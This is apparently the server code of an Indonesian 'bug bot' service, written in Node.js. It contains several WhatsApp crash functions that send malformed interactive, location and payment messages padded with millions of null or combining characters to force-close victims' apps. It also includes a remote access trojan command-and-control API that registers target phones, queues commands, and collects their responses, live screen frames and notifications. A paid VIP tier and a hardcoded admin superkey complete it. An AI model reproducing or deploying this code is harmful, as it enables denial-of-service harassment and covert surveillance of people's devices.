// ===== FITUR RESTART MANUAL (SAMA GAYA DENGAN AUTO RESTART) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
  }, 8000); // kirim pesan sukses setelah 8 detik

  // Tunggu 5 detik lalu restart
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// Express sudah dijalankan lewat server.listen di atas

// ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit

function kirimStatusServer(pesan) {
  try {
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// Kirim notifikasi saat server aktif
kirimStatusServer("✅ Server aktif dan berjalan normal.");

// Kirim notifikasi sebelum restart
setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0); // memicu restart otomatis di panel
  }, 5000); // beri jeda 5 detik agar pesan terkirim dulu
}, RESTART_INTERVAL);

async function QcPay(sock, target, zid = true) {
  const payload = "꧀".repeat(10000)
  const miaw = await generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      body: {
        text: payload
      },
      nativeFlowMessage: {
        messageVersion: 3,
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `detail`
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `ssss`
            })
          }

        ]
      },
      contextInfo: {
        conversionDelaySeconds: 9999,
        forwardingScore: 999999,
        isForwarded: true,
        participant: "0@s.whatsapp.net",
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: payload,
          contentType: 3,
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: 999e+21 * 999e+21
          }
        },
        remoteJid: "@s.whatsapp.net"
      }
    }
  }), {});

  await sock.relayMessage(target, miaw.message, zid ? { messageId: miaw.key.id, participant: { jid: target } } : { messageId: miaw.key.id });
  await sleep(10000);
}

async function permenCall(sock, toJid, isVideo = true) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);

  const callLayout = []
  const offerContent = [
    //{ tag: 'audio', attrs: { enc: 'opus', rate: '16000' } },
    { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
    isVideo ? {
      tag: 'video',
      attrs: {
        enc: 'vp8',
        dec: 'vp8',
        orientation: '0',
        screen_width: '1920',
        screen_height: '1080',
        device_orientation: '0'
      }
    } : null,
    { tag: 'net', attrs: { medium: '3' } },
    { tag: 'capability', attrs: { ver: '1' }, content: Buffer.from([0x00, 0x00, 0x00, 0x00]) },
    { tag: 'encopt', attrs: { keygen: '2' } }
  ].filter(Boolean);

  callLayout.push({ tag: 'title', attrs: { ver: '1' }, content: 'PermenMD' })
  const encKey = crypto.randomBytes(32);
  const devices = (await sock.getUSyncDevices([toJid], true, false))
    .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

  await sock.assertSessions(devices, true);

  const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
    call: { callKey: new Uint8Array(encKey) }
  }, { count: '2' });

  offerContent.push({ tag: 'destination', attrs: {}, content: destinations });

  if (shouldIncludeDeviceIdentity) {
    const { encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys/lib/Utils');
    offerContent.push({
      tag: 'device-identity',
      attrs: {},
      content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
    });
  }

  const stanza = {
    tag: 'call',
    attrs: {
      id: sock.generateMessageTag(),
      to: toJid
    },
    content: [{
      tag: 'offer',
      attrs: {
        'call-id': callId,
        'call-creator': sock.user.id
      },
      content: offerContent
    }]
  };

  await sock.query(stanza).catch(err => console.error("❌ Error sending call:", err));
  return { id: callId, to: toJid };
}


async function iosLx(Yuukey, target) {
  for ( let z = 0; z < 2; z++ ) {
    await Yuukey.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/forno",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: null, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
  }
}

async function gsGlx(Yuukey, target, zid = true) {
  for(let z = 0; z < 10; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "7eppeli - Expos3d",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await Yuukey.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
}
// ── RAT: Ambil pairId milik user (untuk ditampilkan di Device Dashboard) ──────
app.get("/rat/pairid", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === keyInfo.username);
  if (idx === -1) return res.json({ valid: false, message: "User not found" });
  // Generate pairId kalau belum ada dan simpan
  if (!db[idx].pairId) {
    db[idx].pairId = genPairId();
    saveDatabase(db);
    console.log('[PAIRID] Generated for: ' + db[idx].username + ' → ' + db[idx].pairId);
  }
  console.log('[PAIRID] Serving pairId for: ' + db[idx].username + ' → ' + db[idx].pairId);
  res.json({ valid: true, pairId: db[idx].pairId, username: db[idx].username, role: db[idx].role });
});

// ── RAT: permission member bisa lihat device owner ────────────────────────────
// POST /rat/grant-member { ownerKey, memberUsername, deviceIds:[] / allDevices:bool }
app.post("/rat/grant-member", (req, res) => {
  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner can grant" });
  const member = db.find(u => u.username === memberUsername);
  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
  // Simpan permission ke member: bisa lihat device mana saja milik owner
  if (!member.ratPerms) member.ratPerms = {};
  member.ratPerms[owner.username] = {
    approved: true,
    allDevices: allDevices === true,
    deviceIds: Array.isArray(deviceIds) ? deviceIds : [],
  };
  saveDatabase(db);
  console.log(`[GRANT] ${owner.username} → ${memberUsername} | allDevices:${allDevices} | ids:${deviceIds}`);
  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
});

// ── RAT: revoke akses member ───────────────────────────────────────────────────
app.post("/rat/revoke-member", (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner" });
  const member = db.find(u => u.username === memberUsername);
  if (member && member.ratPerms) {
    delete member.ratPerms[owner.username];
    saveDatabase(db);
  }
  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
});

// ── RAT: member cek permission & ambil device yang boleh dilihat ──────────────
app.get("/rat/my-devices", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const targets = readRat(RAT_TARGETS);

  // Owner & Dev: lihat semua device milik sendiri
  if (user.role === "owner" || user.role === "dev") {
    const owned = targets.filter(t => t.owner === user.username);
    return res.json({ valid: true, pairId: user.pairId, role: user.role, devices: owned });
  }

  // Member/reseller: cek device_perms.json (sistem utama)
  const perms = loadDevicePerms();
  const userPerm = perms[user.username.toLowerCase()];

  let allowedDevices = [];

  if (userPerm && userPerm.approved) {
    if (userPerm.allDevices) {
      // Boleh lihat semua device dari semua owner
      allowedDevices = targets;
    } else if (Array.isArray(userPerm.devices) && userPerm.devices.length > 0) {
      // Boleh lihat device tertentu saja
      allowedDevices = targets.filter(t => userPerm.devices.includes(t.id));
    }
  } else {
    // Fallback: cek sistem lama ratPerms di database
    for (const owner of db.filter(u => u.role === "owner" || u.role === "dev")) {
      const perm = owner.ratPerms?.[user.username];
      if (!perm || !perm.approved) continue;
      const ownerDevices = targets.filter(t => t.owner === owner.username);
      if (perm.allDevices) {
        allowedDevices = allowedDevices.concat(ownerDevices);
      } else {
        allowedDevices = allowedDevices.concat(
          ownerDevices.filter(d => (perm.deviceIds || []).includes(d.id))
        );
      }
    }
  }

  res.json({ valid: true, pairId: null, role: user.role, devices: allowedDevices });
});


// ══════════════════════════════════════════════════════════════════════════════
// RAT CORE ENDPOINTS (device target berkomunikasi via port ini)
// ══════════════════════════════════════════════════════════════════════════════

app.post('/api/heartbeat/:id', (req, res) => {
  const id = req.params.id;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].lastSeen = new Date();
    t[i].status   = 'Online';
    if (req.body.battery) t[i].battery = req.body.battery;
    saveRat(RAT_TARGETS, t);
  }
  res.status(200).send('1');
});

app.post('/api/register-target', (req, res) => {
  const d = req.body;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === d.id);
  if (i !== -1) t[i] = { ...t[i], ...d, lastSeen: new Date() };
  else          t.push({ ...d, lastSeen: new Date() });
  saveRat(RAT_TARGETS, t);
  res.json({ status: 'ok' });
});

app.post('/api/pair-target', (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'pairId dan deviceId wajib' });
  
  let db = loadDatabase();
  
  // AUTO-FIX: generate pairId untuk semua user yang belum punya
  let dbChanged = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) {
      db[i].pairId = genPairId();
      dbChanged = true;
      console.log('[AUTO-PAIR] Generated pairId for user: ' + db[i].username + ' → ' + db[i].pairId);
    }
  }
  if (dbChanged) saveDatabase(db);
  
  // Cari owner berdasarkan pairId (case-insensitive)
  const ownerIdx = db.findIndex(u => 
    u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase()
  );
  
  console.log('[PAIR-DEBUG] Looking for pairId: ' + pairId + ' | Found at index: ' + ownerIdx);
  if (ownerIdx >= 0) {
    console.log('[PAIR-DEBUG] Owner found: ' + db[ownerIdx].username + ' | Their pairId: ' + db[ownerIdx].pairId);
  } else {
    console.log('[PAIR-DEBUG] All pairIds in DB: ' + db.map(u => u.username + ':' + u.pairId).join(', '));
  }
  
  if (ownerIdx === -1) return res.status(404).json({ error: 'PairID tidak valid', hint: 'Cek pairId di Device Dashboard AX RRG' });
  const owner = db[ownerIdx];
  if (!owner.devices) owner.devices = [];
  if (!owner.devices.includes(deviceId)) {
    owner.devices.push(deviceId);
    db[ownerIdx] = owner;
    saveDatabase(db);
  }
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === deviceId);
  const dev = { id: deviceId, model: model || 'Unknown', battery: battery || '?', owner: owner.username, status: 'Online', lastSeen: new Date() };
  if (i !== -1) t[i] = { ...t[i], ...dev };
  else          t.push(dev);
  saveRat(RAT_TARGETS, t);
  console.log('[PAIR] ' + deviceId + ' → ' + owner.username);
  res.json({ status: 'paired', ownerUsername: owner.username });
});

app.get('/api/list-targets', (req, res) => {
  const { owner } = req.query;
  const t = readRat(RAT_TARGETS);
  res.json(owner ? t.filter(x => x.owner === owner) : t);
});

app.post('/api/send-command', (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command, extra: extra || '', timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);
  console.log('[CMD] ' + id + ': ' + command);
  res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
  const id = req.params.id;
  let cmds = readRat('./rat_commands.json');
  const i = cmds.findIndex(c => c.targetId === id);
  if (i !== -1) {
    const cmd = cmds[i];
    cmds.splice(i, 1);
    saveRat('./rat_commands.json', cmds);
    return res.json(cmd);
  }
  res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
  const id = req.params.id;
  const { cmd, data } = req.body;
  let resps = readRat('./rat_responses.json');
  const i = resps.findIndex(r => r.targetId === id);
  const nr = { targetId: id, cmd, data, timestamp: new Date() };
  if (i !== -1) resps[i] = nr; else resps.push(nr);
  saveRat('./rat_responses.json', resps);
  console.log('[RESP] ' + cmd + ' from ' + id);
  res.json({ status: 'ok' });
});

app.get('/api/get-response/:id', (req, res) => {
  const resps = readRat('./rat_responses.json');
  res.json(resps.find(r => r.targetId === req.params.id) || {});
});

app.post('/api/live-frame/:id', (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: 'no frame' });
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: 'ok' });
});

app.get('/api/live-frame/:id', (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d) return res.status(404).json({ error: 'no frame yet' });
  res.json(d);
});

app.post('/api/post-notification/:id', (req, res) => {
  let n = readRat('./rat_notifs.json');
  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
  if (n.length > 1000) n = n.slice(0, 1000);
  saveRat('./rat_notifs.json', n);
  res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
  const n = readRat('./rat_notifs.json');
  res.json(n.filter(x => x.targetId === req.params.id));
});

// Init RAT files
['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
  const p = './' + f + '.json';
  if (!fs.existsSync(p)) fs.writeFileSync(p, '[]');
});


// ════════════════════════════════════════════════════════════════════════════
// DELAY FC — Force Close WhatsApp via malformed interactive message
// Teknik: corrupt nativeFlowMessage dengan payload yang tidak bisa di-parse WA
async function delayAxRRG(sock, target) {
  const jid = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net";
  try {
    // Method 1: Corrupt interactive native flow — bikin WA parser hang
    const badFlow = generateWAMessageFromContent(jid, {
      interactiveMessage: {
        header: {
          title: String.fromCharCode(0).repeat(500000),
          hasMediaAttachment: false
        },
        body: {
          text: String.fromCharCode(0).repeat(1000000)
        },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: Array.from({ length: 50000 }, (_, i) => ({
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: String.fromCharCode(0).repeat(50000) + i,
              url: "https://wa.me/" + String.fromCharCode(0).repeat(10000),
              merchant_url: "https://wa.me/" + String.fromCharCode(0).repeat(10000)
            })
          })),
          messageParamsJson: JSON.stringify({
            flow_token: String.fromCharCode(0).repeat(500000),
            flow_id: String.fromCharCode(0).repeat(200000),
            data: Object.fromEntries(
              Array.from({ length: 10000 }, (_, i) => [
                String.fromCharCode(0).repeat(1000) + i,
                String.fromCharCode(0).repeat(5000)
              ])
            )
          })
        },
        contextInfo: {
          forwardingScore: 999999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 5000 }, () =>
            Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            conversation: String.fromCharCode(0).repeat(500000)
          }
        }
      }
    }, {});
    await sock.relayMessage(jid, badFlow.message, { messageId: badFlow.key.id });

    // Method 2: requestPayment dengan data corrupt
    await sock.relayMessage(jid, {
      requestPaymentMessage: {
        currencyCodeIso4217: String.fromCharCode(0).repeat(100000),
        amount1000: 999999999999,
        requestFrom: jid,
        noteMessage: {
          extendedTextMessage: {
            text: String.fromCharCode(0).repeat(2000000),
            contextInfo: {
              mentionedJid: Array.from({ length: 8000 }, () =>
                Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
              ),
              forwardingScore: 999999999
            }
          }
        },
        expiryTimestamp: 99999999999999,
        amount: { offset: 0, value: 999999999, currencyCode: "IDR" }
      }
    }, {});

    console.log("[DELAY FC] Sent to " + jid);
  } catch(e) {
    console.warn("[DELAY FC] Error:", e.message);
  }
}


// ── DEBUG: Lihat pairId semua user (akses dengan superkey) ───────────────────
app.get('/admin/listpairids', (req, res) => {
  const { superkey } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const list = db.map(u => ({ username: u.username, role: u.role, pairId: u.pairId || 'NONE' }));
  res.json(list);
});

// ── FORCE GENERATE pairId untuk 1 user (untuk troubleshoot) ──────────────────
app.get('/admin/genpairid', (req, res) => {
  const { superkey, username } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ error: 'User not found' });
  db[idx].pairId = genPairId();
  saveDatabase(db);
  console.log(`[ADMIN] Force generated pairId for ${username}: ${db[idx].pairId}`);
  res.json({ username, pairId: db[idx].pairId });
});


// ════════════════════════════════════════════════════════════════════════════
// LOCK LIVE CHAT — komunikasi 2 arah owner ↔ target saat device di-lock
// ════════════════════════════════════════════════════════════════════════════
const lockChats = {}; // in-memory { deviceId: [{from, text, time}] }

// Owner kirim pesan ke target (via panel AX RRG)
app.post('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  const { text, from } = req.body;
  if (!text) return res.status(400).json({ error: 'text required' });
  if (!lockChats[id]) lockChats[id] = [];
  const msg = { from: from || 'owner', text, time: new Date().toISOString().substring(11,16) };
  lockChats[id].push(msg);
  if (lockChats[id].length > 200) lockChats[id] = lockChats[id].slice(-200);
  console.log(`[CHAT] ${from||'owner'} → ${id}: ${text}`);
  res.json({ status: 'sent' });
});

// Target ambil semua pesan (polling setiap 2 detik dari APK)
app.get('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

// Panel ambil semua pesan (polling dari AX RRG)
app.get('/api/lock-chat-all/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

// Clear chat saat unlock
app.delete('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  lockChats[id] = [];
  res.json({ status: 'cleared' });
});

// ============================================================
// ===== VIP UPGRADE REQUEST SYSTEM ===========================
// ============================================================
//
// Alur:
// 1. User pilih durasi VIP di Flutter (1/3/7/31 hari / permanen)
// 2. User upload bukti transfer (gambar) → POST /requestVip
// 3. Request disimpan ke vipRequests.json dengan status "pending"
//    + bukti disimpan ke folder /proofs/<requestId>.<ext>
// 4. Owner lihat list request lewat GET /listVipRequests
// 5. Owner approve (POST /approveVip) atau reject (POST /rejectVip)
// 6. Pas approve:
//    - User role → "vip"
//    - expiredDate ditambah sesuai durasi (atau set jauh ke depan kalau permanen)
//    - Status request → "approved"
// 7. Flutter polling GET /myVipRequest buat tau status terbaru
//    - kalau approved → popup sukses premium
//    - kalau rejected → popup tolak premium
//
// ============================================================

const vipRequestsFile = path.join(__dirname, 'vipRequests.json');
const proofDir = path.join(__dirname, 'proofs');
if (!fs.existsSync(proofDir)) fs.mkdirSync(proofDir, { recursive: true });

function loadVipRequests() {
  try {
    if (!fs.existsSync(vipRequestsFile)) return [];
    return JSON.parse(fs.readFileSync(vipRequestsFile, 'utf8'));
  } catch (_) {
    return [];
  }
}
function saveVipRequests(data) {
  fs.writeFileSync(vipRequestsFile, JSON.stringify(data, null, 2));
}

// Daftar paket VIP yang tersedia. Harga dalam Rupiah.
// "days: 0" artinya permanen (diset 100 tahun ke depan).
const VIP_PACKAGES = [
  { id: '1d',     label: '1 Hari',     days: 1,     price: 5000   },
  { id: '3d',     label: '3 Hari',     days: 3,     price: 10000  },
  { id: '7d',     label: '7 Hari',     days: 7,     price: 15000  },
  { id: '31d',    label: '31 Hari',    days: 31,    price: 55000  },
  { id: 'forever',label: 'Permanen',   days: 0,     price: 100000 },
  { id: 'seles',   label: 'Seles',       days: 0,     price: 800000 },
];

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
}

// ── VIP helper: upgrade user + extend expiredDate ──
// Dipakai oleh endpoint /approveVip dan tombol Telegram approve.
// Return { ok, request, user, message }
function doApproveVip(requestId, decidedBy) {
  const requests = loadVipRequests();
  const idx = requests.findIndex(r => r.id === requestId);
  if (idx === -1) return { ok: false, message: 'Request not found' };

  const r = requests[idx];
  if (r.status !== 'pending') {
    return { ok: false, message: `Request sudah ${r.status}` };
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === r.username);
  if (!user) return { ok: false, message: 'User not found' };

  let newExpired;
  if (r.days === 0) {
    newExpired = new Date();
    newExpired.setFullYear(newExpired.getFullYear() + 100);
  } else {
    const baseDate = user.expiredDate && !isExpired(user)
      ? new Date(user.expiredDate)
      : new Date();
    baseDate.setDate(baseDate.getDate() + r.days);
    newExpired = baseDate;
  }
  user.expiredDate = newExpired.toISOString().split('T')[0];
  user.role = (r.packageId === 'seles') ? 'seles' : 'vip';
  saveDatabase(db);

  r.status = 'approved';
  r.decidedAt = new Date().toISOString();
  r.decidedBy = decidedBy;
  requests[idx] = r;
  saveVipRequests(requests);

  console.log(`[VIP] ✅ ${decidedBy} APPROVED ${r.username} → VIP (${r.packageLabel})`);
  fs.appendFileSync('logUser.txt', `${decidedBy} ApprovedVip ${r.username} ${r.packageLabel}\n`);

  return { ok: true, request: r, user: { username: user.username, role: user.role, expiredDate: user.expiredDate } };
}

// ── VIP helper: reject request ──
function doRejectVip(requestId, decidedBy, reason) {
  const requests = loadVipRequests();
  const idx = requests.findIndex(r => r.id === requestId);
  if (idx === -1) return { ok: false, message: 'Request not found' };

  const r = requests[idx];
  if (r.status !== 'pending') {
    return { ok: false, message: `Request sudah ${r.status}` };
  }

  r.status = 'rejected';
  r.decidedAt = new Date().toISOString();
  r.decidedBy = decidedBy;
  r.rejectReason = (typeof reason === 'string' && reason.trim().length > 0)
    ? reason.trim()
    : 'Pembayaran tidak valid';
  requests[idx] = r;
  saveVipRequests(requests);

  console.log(`[VIP] ❌ ${decidedBy} REJECTED ${r.username} (${r.packageLabel}) — ${r.rejectReason}`);
  fs.appendFileSync('logUser.txt', `${decidedBy} RejectedVip ${r.username} ${r.packageLabel}\n`);

  return { ok: true, request: r };
}

// ── Telegram: kirim notifikasi VIP request ke OWNER_ID ──
// Kirim foto bukti + caption + inline button Approve/Reject.
async function notifyOwnerVipRequest(reqObj) {
  if (!bot || !OWNER_ID) return;
  const proofPath = path.join(__dirname, reqObj.proofFile || '');
  const caption =
    `🔔 *NEW VIP REQUEST*\n\n` +
    `👤 Username: *${reqObj.username}*\n` +
    `📦 Paket: *${reqObj.packageLabel}*\n` +
    `💰 Harga: *Rp ${Number(reqObj.price).toLocaleString('id-ID')}*\n` +
    `🌐 IP: \`${reqObj.ip || 'unknown'}\`\n` +
    `🕒 Waktu: ${new Date(reqObj.createdAt).toLocaleString('id-ID')}\n` +
    `🆔 ID: \`${reqObj.id}\`\n\n` +
    `Klik tombol di bawah buat approve/reject langsung dari sini.`;

  const opts = {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ APPROVE', callback_data: `vip_approve_${reqObj.id}` },
          { text: '❌ REJECT',  callback_data: `vip_reject_${reqObj.id}` },
        ],
        [
          { text: '👁 LIHAT BUKTI (web)', callback_data: `vip_view_${reqObj.id}` },
        ],
      ],
    },
  };

  try {
    if (fs.existsSync(proofPath)) {
      await bot.sendPhoto(OWNER_ID, proofPath, { ...opts, caption });
    } else {
      await bot.sendMessage(OWNER_ID, caption, opts);
    }
    console.log(`[VIP-TELEGRAM] Notifikasi request ${reqObj.id} terkirim ke owner ${OWNER_ID}`);
  } catch (err) {
    console.error(`[VIP-TELEGRAM] Gagal kirim notifikasi: ${err.message}`);
  }
}

// ── Telegram: kirim notifikasi hasil decision ke owner (confirmation) ──
async function notifyOwnerVipDecision(reqObj, decidedBy, action, extra) {
  if (!bot || !OWNER_ID) return;
  try {
    const emoji = action === 'approved' ? '✅' : '❌';
    const txt =
      `${emoji} *VIP REQUEST ${action.toUpperCase()}*\n\n` +
      `👤 User: *${reqObj.username}*\n` +
      `📦 Paket: ${reqObj.packageLabel} (Rp ${Number(reqObj.price).toLocaleString('id-ID')})\n` +
      `🛠 Decided by: ${decidedBy}\n` +
      (action === 'approved'
        ? `🎯 Role sekarang: *VIP*\n⏰ Expired: ${extra?.expiredDate || '-'}\n`
        : `📝 Alasan: ${extra?.reason || 'Pembayaran tidak valid'}\n`);
    await bot.sendMessage(OWNER_ID, txt, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error(`[VIP-TELEGRAM] Gagal kirim decision notif: ${err.message}`);
  }
}

// POST /requestVip
// Body JSON: { key, packageId, proofBase64, proofMime }
// proofBase64 = data URL atau base64 mentah (image/jpeg, image/png, image/webp)
app.post('/requestVip', (req, res) => {
  const { key, packageId, proofBase64, proofMime } = req.body || {};

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: 'User not found' });

  const pkg = VIP_PACKAGES.find(p => p.id === packageId);
  if (!pkg) return res.status(400).json({ valid: false, message: 'Paket VIP tidak dikenal' });

  if (!proofBase64 || typeof proofBase64 !== 'string' || proofBase64.length < 100) {
    return res.status(400).json({ valid: false, message: 'Bukti transfer wajib diupload' });
  }

  // Cek apakah user masih punya request pending
  const requests = loadVipRequests();
  const pending = requests.find(r => r.username === user.username && r.status === 'pending');
  if (pending) {
    return res.json({
      valid: false,
      message: 'Kamu masih punya request VIP pending. Tunggu owner konfirmasi dulu.'
    });
  }

  // Parse base64 (support both "data:image/jpeg;base64,xxxx" dan "xxxx")
  let rawB64 = proofBase64;
  let mime = proofMime || 'image/jpeg';
  const m = proofBase64.match(/^data:([a-zA-Z0-9/+.-]+);base64,(.+)$/);
  if (m) {
    mime = m[1];
    rawB64 = m[2];
  }
  let ext = 'jpg';
  if (mime.includes('png')) ext = 'png';
  else if (mime.includes('webp')) ext = 'webp';

  const requestId = `${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
  const proofPath = path.join(proofDir, `${requestId}.${ext}`);

  try {
    fs.writeFileSync(proofPath, Buffer.from(rawB64, 'base64'));
  } catch (e) {
    return res.status(500).json({ valid: false, message: 'Gagal menyimpan bukti: ' + e.message });
  }

  const newRequest = {
    id: requestId,
    username: user.username,
    packageId: pkg.id,
    packageLabel: pkg.label,
    price: pkg.price,
    days: pkg.days,
    ip: getClientIp(req),
    proofFile: `proofs/${requestId}.${ext}`,
    status: 'pending',          // pending | approved | rejected
    createdAt: new Date().toISOString(),
    decidedAt: null,
    decidedBy: null,
    rejectReason: null,
  };

  requests.push(newRequest);
  saveVipRequests(requests);

  console.log(`[VIP] Request ${requestId} dari ${user.username} paket ${pkg.label} (Rp${pkg.price})`);

  // 🔔 Kirim notifikasi ke Telegram owner (async, gak blocking response)
  notifyOwnerVipRequest(newRequest).catch(() => {});

  return res.json({ valid: true, request: newRequest });
});

// GET /myVipRequest?key=...
// Return request terbaru user (apa pun status-nya). Kalau gak ada, return null.
app.get('/myVipRequest', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const requests = loadVipRequests();
  // Ambil request terbaru berdasarkan createdAt
  const mine = requests
    .filter(r => r.username === keyInfo.username)
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  if (mine.length === 0) return res.json({ valid: true, request: null });

  return res.json({
    valid: true,
    request: mine[0],
    packages: VIP_PACKAGES,
  });
});

// GET /listVipRequests?key=...&status=pending|approved|rejected|all
// Owner only. Default: pending.
app.get('/listVipRequests', (req, res) => {
  const { key, status } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner can view VIP requests' });
  }

  let requests = loadVipRequests();
  const filterStatus = status || 'pending';
  if (filterStatus !== 'all') {
    requests = requests.filter(r => r.status === filterStatus);
  }
  // Urutkan terbaru dulu
  requests.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  return res.json({ valid: true, requests, packages: VIP_PACKAGES });
});

// GET /vipProof?key=...&id=...
// Owner only. Stream file bukti transfer.
app.get('/vipProof', (req, res) => {
  const { key, id } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
